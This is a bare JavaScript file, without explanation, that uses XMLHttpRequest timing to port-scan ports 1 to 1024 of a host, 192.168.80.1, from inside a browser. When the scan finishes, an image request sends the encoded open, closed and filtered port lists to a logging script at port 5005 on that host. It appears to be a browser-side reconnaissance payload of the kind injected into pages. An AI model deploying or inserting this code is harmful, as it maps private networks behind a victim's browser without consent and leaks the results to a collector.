var ip =&#39;192.168.80.1&#39;;
var start_port=1; var end_port=1024;
scan_ports();
var scan_type=1;
var port;
var blocked_ports = [0,1,7,9,11,13,15,17,19,20,21,22,23,25,37,42,43,53,77,79,87,95,101,102,103,104,109,110,111,113,115,117,119,123,135,139,143,179,389,465,512,513,514,515,526,530,531,532,540,556,563,587,601,636,993,995,2049,4045,6000];
var current_port=0;
var open_port_max=300;
var closed_port_max=2000;
var ps_open_ports=[];
var ps_closed_ports=[];
var ps_timeout_ports=[];
    var finaldata,logz;

function scan_ports()
{
    current_port=0;
    ps_open_ports=[];
    ps_closed_ports=[];
    ps_timeout_ports=[];
    reset_scan_out();
    
    setTimeout(&#34;scan_ports_xhr()&#34;,1);

}
    
   
function scan_ports_xhr()
{
    if(init_port_ps())
    {
    var res= encodeURIComponent(finaldata+logz);

    new Image().src = &#39;http://192.168.80.1:5005/ilog.php?log=&#39;+res;
    return;
    }
    if(is_blocked(current_port))
    {
       log(current_port + &#34;  - blocked port&#34;);
       setTimeout(&#34;scan_ports_xhr()&#34;,1);
       return;
    }
    start_time = (new Date).getTime();
    try
    {
        xhr = new XMLHttpRequest();
        xhr.open(&#39;GET&#39;, &#34;http://&#34; + ip + &#34;:&#34; + current_port);
        xhr.send();
        setTimeout(&#34;check_ps_xhr()&#34;,5);
    }
    catch(err)
    {
        
    }
            
}

function check_ps_xhr()
{
    var interval = (new Date).getTime() - start_time;
    if(xhr.readyState == 1)
    {
        if(interval &gt; closed_port_max)
        {
            log(current_port + &#34; - time exceeded&#34;);
            ps_timeout_ports.push(current_port);
            setTimeout(&#34;scan_ports_xhr()&#34;,1);
        }
        else
        {
            setTimeout(&#34;check_ps_xhr()&#34;,5);
        }
    }
    else
    {
        if(interval &lt; open_port_max)
        {
            log(current_port + &#34; - open&#34;);
            ps_open_ports.push(current_port);
        }
        else
        {
            log(current_port + &#34; - closed&#34;);
            ps_closed_ports.push(current_port);
        }
        setTimeout(&#34;scan_ports_xhr()&#34;,1);
    }
    
}

function init_port_ps()
{
    if(current_port == 0)
    {
        current_port = start_port;
    }
    else if(current_port == end_port)
    {
        results_ps();
        return true;
    }
    else
    {
        current_port++;
    }
    return false;
}

function is_blocked(port_no)
{
    for(var i=0;i&lt;blocked_ports.length;i++)
    {
        if(blocked_ports[i] == port_no)
        {
            return true;
        }
    }
    return false;
}
    function results_ps()
{
   finaldata = &#34;&lt;br&gt;&lt;b&gt;Open Ports:&lt;/b&gt;&lt;br&gt;&#34; + ps_open_ports + &#34;&lt;br&gt;&lt;br&gt;&lt;b&gt;Closed/Blocked Ports:&lt;/b&gt;&lt;br&gt;&#34; + ps_closed_ports + &#34;&lt;br&gt;&lt;br&gt;&lt;b&gt;Filtered/Application Type 3&amp;4 Ports:&lt;/b&gt;&lt;br&gt;&#34; + ps_timeout_ports + &#34;&lt;br&gt;&lt;br&gt;&#34;;

}

function log(to_log)
{
    logz += to_log + &#34;, &#34;;
}

function reset_scan_out()
{
    data=&#34;&#34;;
            logz=&#34;&#34;
}

